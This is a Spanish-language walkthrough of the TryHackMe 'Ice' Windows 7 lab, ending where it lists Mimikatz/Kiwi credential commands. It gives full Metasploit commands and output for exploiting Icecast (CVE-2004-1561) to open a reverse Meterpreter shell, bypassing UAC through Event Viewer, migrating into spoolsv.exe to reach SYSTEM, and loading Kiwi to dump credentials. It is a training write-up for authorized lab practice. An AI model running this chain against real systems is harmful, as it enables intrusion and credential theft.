---
tags:
  - CVE-2004-1561
  - Windows
  - Mimikatz
  - Metasploit
  - Nmap
  - Escalada_Privilegios
  - meterpreter
  - bypassuac_eventvwr
---

## Introducción a la máquina 

La máquina `Ice`  es un host Windows 7 Professional Service Pack 1 (x64) desplegado como laboratorio en TryHackMe con el propósito de practicar técnicas de pentesting y post-explotación. El ejercicio tenía como objetivo aplicar un flujo completo de ataque: reconocimiento externo, explotación remota de un servicio vulnerable, movimiento e identificación de vectores locales, escalada de privilegios y recolección de credenciales en un entorno controlado y autorizado.

Durante la fase de reconocimiento se detectaron múltiples servicios expuestos (SMB/RDP/RPC) y, de forma destacada, un servidor **Icecast** escuchando en el puerto **8000/tcp**, lo que motivó la búsqueda de exploits públicos. La explotación remota de Icecast permitió obtener una primera sesión Meterpreter con privilegios de usuario local; a partir de esa posición se realizó enumeración interna para identificar procesos críticos y vectores locales, lo que condujo al uso de un módulo de bypass de UAC (Event Viewer) que posibilitó la elevación a **NT AUTHORITY\SYSTEM**. Finalmente, al operar con contexto SYSTEM se cargó la extensión **Kiwi (Mimikatz integrado)** y se recuperaron credenciales y hashes presentes en memoria, demostrando la eficacia de la cadena de ataque en un laboratorio controlado.

Este informe documenta cada etapa del proceso —comandos ejecutados, hallazgos, evidencia y recomendaciones— y finaliza con un conjunto de mitigaciones priorizadas para reducir el riesgo de explotación en entornos productivos. Todas las pruebas se realizaron dentro del alcance autorizado del laboratorio; fuera de un entorno controlado estas técnicas son maliciosas y no deben reproducirse sin consentimiento expreso.

# Reconocimiento

Se realizó un escaneo de puertos completo y detección de servicios en la máquina objetivo utilizando **Nmap**, con los siguientes parámetros: escaneo TCP SYN (`-sS`), detección de versión (`-sV`), escaneo de scripts por defecto (`-sC`), escaneo de todos los puertos (`-p-`), y sin ping (`-Pn`). Se generó un archivo de salida para documentación:

```bash
─$ nmap -sV -sS -Pn -p- -sC --min-rate 2500 10.10.39.239 -oN nmap.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-18 15:30 CDT
Warning: 10.10.39.239 giving up on port because retransmission cap hit (10).
Stats: 0:01:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 15:32 (0:00:46 remaining)
Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 15:32 (0:00:52 remaining)
Nmap scan report for 10.10.39.239
Host is up (0.17s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-09-18T20:31:53+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DARK-PC
|   NetBIOS_Domain_Name: DARK-PC
|   NetBIOS_Computer_Name: DARK-PC
|   DNS_Domain_Name: Dark-PC
|   DNS_Computer_Name: Dark-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2025-09-18T20:31:47+00:00
| ssl-cert: Subject: commonName=Dark-PC
| Not valid before: 2025-09-17T20:27:41
|_Not valid after:  2026-03-19T20:27:41
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
8000/tcp  open  http          Icecast streaming media server
|_http-title: Site doesn't have a title (text/html).
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:08:5a:f0:ec:7d (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-18T15:31:47-05:00
| smb2-time: 
|   date: 2025-09-18T20:31:47
|_  start_date: 2025-09-18T20:27:39
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
```

El escaneo identificó que la máquina objetivo se encuentra activa y responde en múltiples puertos. La información obtenida incluye:

- **Sistema Operativo:** Windows 7 Professional Service Pack 1 (6.1.7601)
- **Nombre del host:** DARK-PC
- **Grupo de trabajo:** WORKGROUP

### Servicios identificados

Entre los servicios detectados se encuentran:

| Puerto          | Servicio      | Versión / Información relevante                        |
| --------------- | ------------- | ------------------------------------------------------ |
| 135/tcp         | msrpc         | Microsoft Windows RPC                                  |
| 139/tcp         | netbios-ssn   | Microsoft Windows netbios-ssn                          |
| 445/tcp         | microsoft-ds  | Windows 7 Professional 7601 SP1 (Workgroup: WORKGROUP) |
| 3389/tcp        | ms-wbt-server | Microsoft Terminal Service                             |
| 5357/tcp        | http          | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                |
| 8000/tcp        | http          | Icecast streaming media server                         |
| 49152-49160/tcp | msrpc         | Microsoft Windows RPC                                  |

Se observó además información detallada a través de los scripts de Nmap:

- `ssl-date` y `ssl-cert` indicaron fechas de validez del certificado y nombre común del host (`Dark-PC`).
- `smb-os-discovery` confirmó el sistema operativo y versión.
- `smb-security-mode` mostró que la firma de mensajes SMB está deshabilitada, lo que representa un riesgo de seguridad.

### Servicio de interés: Icecast (8000/tcp)

Durante el análisis de los servicios abiertos, el que llamó mayor atención fue:

```bash
8000/tcp  open  http          Icecast streaming media server
```

Esto se debe a que versiones antiguas de Icecast (2.0.1 y anteriores) presentan una vulnerabilidad conocida:

- **CVE-2004-1561**: Buffer Overflow en los encabezados HTTP que puede permitir la ejecución remota de código.
    

Este hallazgo es relevante ya que identifica un servicio potencialmente vulnerable que podría ser explotado para obtener acceso adicional o realizar pruebas de post-explotación dentro de un entorno controlado.

## Búsqueda de exploits para Icecast

Tras identificar el servicio **Icecast** corriendo en el puerto `8000/tcp`, se procedió a buscar posibles vulnerabilidades utilizando **SearchSploit**, una herramienta que permite consultar la base de datos de exploits conocidos en sistemas Linux y Windows.

```bash
└─$ searchsploit icecast                     
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Icecast 1.1.x/1.3.x - Directory Traversal                                                                                                                                       | multiple/remote/20972.txt
Icecast 1.1.x/1.3.x - Slash File Name Denial of Service                                                                                                                         | multiple/dos/20973.txt
Icecast 1.3.7/1.3.8 - 'print_client()' Format String                                                                                                                            | windows/remote/20582.c
Icecast 1.x - AVLLib Buffer Overflow                                                                                                                                            | unix/remote/21363.c
Icecast 2.0.1 (Win32) - Remote Code Execution (1)                                                                                                                               | windows/remote/568.c
Icecast 2.0.1 (Win32) - Remote Code Execution (2)                                                                                                                               | windows/remote/573.c
Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)                                                                                                                     | windows_x86/remote/16763.rb
Icecast 2.x - XSL Parser Multiple Vulnerabilities                                                                                                                               | multiple/remote/25238.txt
icecast server 1.3.12 - Directory Traversal Information Disclosure                                                                                                              | linux/remote/21602.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


La búsqueda arrojó múltiples resultados, entre los que destacan:

| Exploit                                                     | Plataforma      | Comentario                                                               |
| ----------------------------------------------------------- | --------------- | ------------------------------------------------------------------------ |
| Icecast 2.0.1 (Win32) - Remote Code Execution (1)           | Windows         | Posible ejecución remota de código vía buffer overflow en cabeceras HTTP |
| Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit) | Windows x86     | Módulo de Metasploit para explotación directa                            |
| Otros                                                       | Windows / Linux | Incluyen DoS, directory traversal, format string, etc.                   |
Se determinó que **el módulo de Metasploit para Windows x86 era aplicable** para el laboratorio, dado que la máquina objetivo ejecuta Windows 7 x64 pero el exploit de Metasploit estaba diseñado para arquitecturas x86 y la versión de Icecast coincidía con la vulnerable reportada.

## Uso de Metasploit

Se procedió a iniciar **Metasploit Framework** y buscar el módulo correspondiente:

```bash
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```

**Descripción:** Icecast Header Overwrite – permite explotar la vulnerabilidad conocida en Icecast 2.0.1 para lograr ejecución remota de código.

Se verificaron las opciones del módulo con:

```bash
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.145.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

El exploit se configuró únicamente estableciendo `RHOSTS` y `LHOST`, ya que los valores por defecto del módulo para el resto de parámetros eran adecuados para el laboratorio.

## Ejecución del exploit

Posterior a la configuración, se ejecutó el módulo con:

```bash
msf6 exploit(windows/http/icecast_header) > exploit
[*] Started reverse TCP handler on 10.23.120.245:4444 
[*] Sending stage (177734 bytes) to 10.10.39.239
[*] Meterpreter session 1 opened (10.23.120.245:4444 -> 10.10.39.239:49187) at 2025-09-18 15:43:49 -0500

meterpreter >
```

## Obtención de shell tipo Meterpreter y reconocimiento inicial

Tras explotar exitosamente la vulnerabilidad en **Icecast 2.0.1** mediante el módulo `exploit/windows/http/icecast_header` de Metasploit, se abrió una **sesión Meterpreter**:

## Que es Meterpreter

Una **shell tipo Meterpreter** es un payload avanzado de Metasploit que permite ejecutar comandos en la máquina objetivo de manera interactiva y flexible. A diferencia de una shell tradicional, Meterpreter:

- Corre completamente en memoria, lo que reduce su huella en disco y dificulta la detección.
- Proporciona comandos específicos de post-explotación (`getuid`, `ps`, `migrate`, `load kiwi`) que permiten escalada de privilegios, volcado de credenciales, manipulación de procesos, captura de hashes y más.
- Permite migrar a otros procesos y cargar extensiones sin perder la sesión activa, a diferencia de una shell de sistema básica.

Para obtener información básica del sistema se utilizó el comando `systeminfo` desde de Meterpreter:

```bash
systeminfo


Host Name:                 DARK-PC
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Dark
Registered Organization:   
Product ID:                00371-177-0000061-85305
Original Install Date:     11/12/2019, 4:48:23 PM
System Boot Time:          9/18/2025, 3:26:14 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-06:00) Central Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,426 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,374 MB
Virtual Memory: In Use:    721 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\DARK-PC
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB2534111
                           [02]: KB976902
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Local Area Connection 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.0.1
                                 IP address(es)
                                 [01]: 10.10.39.239
                                 [02]: fe80::5c54:8b08:a147:bc3d
```

La salida confirmó que la máquina objetivo corre **Windows 7 Professional SP1 x64**, con un solo procesador Intel y 2 GB de RAM, bajo el nombre de host **DARK-PC** y grupo de trabajo **WORKGROUP**. Esta información es útil para seleccionar exploits compatibles con la arquitectura y versión del sistema.

## Post-explotación inicial: descubrimiento de exploits locales

Para continuar con la auditoría de post-explotación y evaluar posibles vectores de escalada de privilegios, se puso la sesión de Meterpreter en segundo plano.

Posteriormente, se ejecutó el módulo **Local Exploit Suggester**, que recopila exploits locales aplicables a la sesión actual y la arquitectura del sistema:

```bash
Background channel 1? [y/N]  y
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.10.39.239 - Collecting local exploits for x86/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 10.10.39.239 - 203 exploit checks are being tried...
[+] 10.10.39.239 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.39.239 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.39.239 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.39.239 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.39.239 - Valid modules for session 1:
```

El módulo analizó la máquina y reportó múltiples exploits potencialmente vulnerables, incluyendo:

- `exploit/windows/local/bypassuac_comhijack`
- `exploit/windows/local/bypassuac_eventvwr`
- `exploit/windows/local/ms13_081_track_popup_menu`
- `exploit/windows/local/tokenmagic`  
… entre otros.


Estos resultados proporcionan un inventario de vectores de escalada de privilegios para usuarios con permisos limitados.

## Escalada de privilegios: módulo `bypassuac_eventvwr`

Tras evaluar los exploits sugeridos, se identificó que, debido a la arquitectura x64 del sistema y la configuración del UAC, era posible utilizar el módulo:

```bash
 exploit/windows/local/bypassuac_eventvwr
```

# ¿Qué hace este módulo?

`bypassuac_eventvwr` es un módulo de Metasploit para **evadir User Account Control (UAC)** en Windows aprovechando un truco relacionado con el **Event Viewer (eventvwr.exe)**. Básicamente, el módulo inserta (temporalmente) una entrada que provoca que, al lanzarse el visualizador de eventos, se ejecute un comando controlado por el atacante con privilegios elevados, lo que permite obtener una segunda shell sin la restricción de UAC. El módulo **limpia** la entrada del registro después de que el payload se ejecute.

### Configuración del módulo

Al cargar el módulo, se verificaron sus opciones:

```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > show options

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.223.23.234  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

```

Opciones importantes:

- **SESSION:** Sesión de Meterpreter sobre la cual se ejecutará el exploit (requerido).
- **Payload (windows/meterpreter/reverse_tcp):**
    
    - **LHOST:** Dirección IP local para recibir la conexión inversa.
    - **LPORT:** Puerto de escucha para el handler.
    - **EXITFUNC:** Técnica de salida del payload (`process` por defecto).


Para seleccionar la sesión correcta, primero se listaron las sesiones de Meterpreter activas con:

```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.23.120.245:4444 -> 10.10.39.239:49187 (10.10.39.239)
```

En este caso, la sesión a usar era la **1**, correspondiente a la shell obtenida previamente tras explotar Icecast.

### Ejecución del módulo

Posteriormente, se ejecutó el exploit:

```bash
msf6 exploit(windows/local/bypassuac_eventvwr) > exploit
[*] Started reverse TCP handler on 10.23.120.245:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (177734 bytes) to 10.10.39.239
[*] Meterpreter session 2 opened (10.23.120.245:4444 -> 10.10.39.239:49189) at 2025-09-18 16:02:13 -0500
[*] Cleaning up registry keys ...
```

**Explicación:**

1. El módulo verifica el estado de **UAC** y los privilegios de la sesión actual.
2. Inserta temporalmente claves de registro para redirigir la ejecución del **Event Viewer** a un payload controlado.
3. Ejecuta `eventvwr.exe`, que, al iniciarse, lanza el payload con **privilegios elevados**.
4. Se abre una **nueva sesión de Meterpreter** (sesión 2) con permisos de **SYSTEM**, mientras que las claves de registro se eliminan automáticamente para reducir rastros.

### Conexión a la nueva sesión

Se nos creara una `nueva sesion de meterpreter`.

Para interactuar con la sesión elevada:

```bash
meterpreter > sessions -i 2
[*] Backgrounding session 1...
```

### Verificación de privilegios

Con el comando `getprivs` se listaron los privilegios disponibles en el proceso:

```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

estos son los privilegios que tenemos  

## Migración a un proceso con privilegios elevados

Tras revisar la lista de procesos activos con el comando `ps` en Meterpreter:

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 100   604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 348   1284  powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 500   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 560   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1192  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1308  500   dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
 1320  1292  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
 1372  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1400  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1456  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
 1560  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 1580  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1588  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1636  2240  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 1648  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1684  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1740  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 1832  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1992  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1996  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2060  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2232  1832  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 2240  1320  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2296  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
 2356  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2540  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2632  2240  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 2636  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
 2900  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2908  2240  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
 2920  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
```


Se identificó un proceso especialmente relevante: **`spoolsv.exe`**.

## Contexto: qué es `spoolsv.exe`

- `spoolsv.exe` es el **servicio de cola de impresión de Windows** (Print Spooler).
- Es un proceso **siempre en ejecución** en Windows, que corre normalmente con los **privilegios más altos del sistema**: **NT AUTHORITY\SYSTEM**.
- Esto lo hace un objetivo perfecto para migrar porque cualquier código que se ejecute dentro de este proceso heredará **esos privilegios SYSTEM**.

## Por qué migramos un proceso

Cuando estás en Meterpreter, tu payload inicial puede estar corriendo en un proceso con permisos limitados (por ejemplo, un usuario estándar o un proceso x86). Para poder realizar ciertas tareas de post-explotación, necesitas dos cosas:

1. **Misma arquitectura que el proceso objetivo**
    
    - Ejemplo: LSASS en la máquina es **x64**. Si tu Meterpreter está en un proceso x86, no puedes leer la memoria de LSASS directamente.
    - Migrar a un proceso x64 (como `spoolsv.exe`) resuelve este problema.


2. **Privilegios suficientes**
   - Algunas operaciones (como interactuar con LSASS o cargar extensiones tipo Kiwi) requieren privilegios **SYSTEM**.
   - `spoolsv.exe` ya corre como SYSTEM, así que al migrar tu Meterpreter a ese proceso, automáticamente **heredas esos privilegios**.


## Qué significa “vivir en un proceso” (`living in a process`

- En términos técnicos: **Meterpreter deja de ejecutarse en el proceso inicial y se “inyecta” dentro de otro proceso activo**.
- Desde allí, puedes ejecutar código como si fueras ese proceso, heredando **sus permisos, arquitectura y contexto**.
- Esto es útil para:
    - Evitar problemas de arquitectura (x86/x64).
    - Conseguir permisos elevados (SYSTEM).
    - Interactuar con procesos protegidos como LSASS sin bloquearlos o ser limitado.


## Por qué `spoolsv.exe` específicamente

- Siempre está activo en Windows, así que no tienes que preocuparte de que esté cerrado.
- Reinicia automáticamente si se bloquea, así que no afecta la estabilidad del sistema en un lab.
- Corre como SYSTEM → permite realizar operaciones que requieren privilegios máximos.
- Es un proceso de confianza para Windows → muchos exploits de post-explotación y herramientas de pentesting lo usan como target seguro para migrar.


### Migración

Para realizar la migración, se ejecutó el siguiente comando:

```bash
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 348 to 1372...
[*] Migration completed successfully.
```

**Resultado esperado:**

- La sesión de Meterpreter ahora está “viviendo dentro” del proceso `spoolsv.exe`.
- Esto asegura que cualquier acción subsecuente, como cargar extensiones de post-explotación o herramientas de dumping de credenciales, se ejecute con **privilegios completos de SYSTEM**, aumentando significativamente la capacidad de control sobre la máquina objetivo.

## Escalamiento de privilegios y extracción de credenciales

Tras migrar de manera exitosa hacia el proceso **`spoolsv.exe`**, que se ejecuta con los **privilegios más altos del sistema**, nuestra sesión de Meterpreter ahora opera bajo la cuenta **`NT AUTHORITY\SYSTEM`**, el nivel máximo de permisos en un sistema Windows.

Para confirmar nuestros privilegios y la identidad del usuario, se ejecutaron los siguientes comandos:

```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeImpersonatePrivilege
SeTcbPrivilege
```


```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Estos resultados verifican que cualquier acción que realicemos a continuación se ejecutará con privilegios **completos de SYSTEM**, lo que nos permite interactuar con información sensible del sistema y de los usuarios.

El siguiente paso en el laboratorio consiste en obtener información sensible de los usuarios de la máquina de manera controlada, como parte de la práctica de post-explotación. Para ello, se utiliza una extensión de **Meterpreter** llamada **`kiwi`**, que corresponde a la versión integrada de la conocida herramienta de auditoría de seguridad **Mimikatz**.

Esta herramienta permite interactuar con los mecanismos de autenticación de Windows y acceder a datos almacenados en memoria, como hashes de contraseñas o tickets de sesión, siempre dentro de un entorno autorizado y seguro de laboratorio.

Para cargar la extensión en nuestra sesión de Meterpreter se ejecuta el comando:

```bash
meterpreter > load kiwi 
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```


Al ejecutarlo, Meterpreter carga la extensión en memoria y amplía su conjunto de comandos con funcionalidades específicas de `Mimikatz`, lo que se refleja en la siguiente salida:

### Visualización de comandos de Kiwi

Una vez cargada la extensión **`kiwi`** en nuestra sesión de Meterpreter, podemos consultar todas las acciones disponibles utilizando el comando:

```bash
Kiwi Commands
=============

    Command                   Description
    -------                   -----------
    creds_all                 Retrieve all credentials (parsed)
    creds_kerberos            Retrieve Kerberos creds (parsed)
    creds_livessp             Retrieve Live SSP creds
    creds_msv                 Retrieve LM/NTLM creds (parsed)
    creds_ssp                 Retrieve SSP creds
    creds_tspkg               Retrieve TsPkg creds (parsed)
    creds_wdigest             Retrieve WDigest creds (parsed)
    dcsync                    Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm               Retrieve user account NTLM hash, SID and RID via DCSync
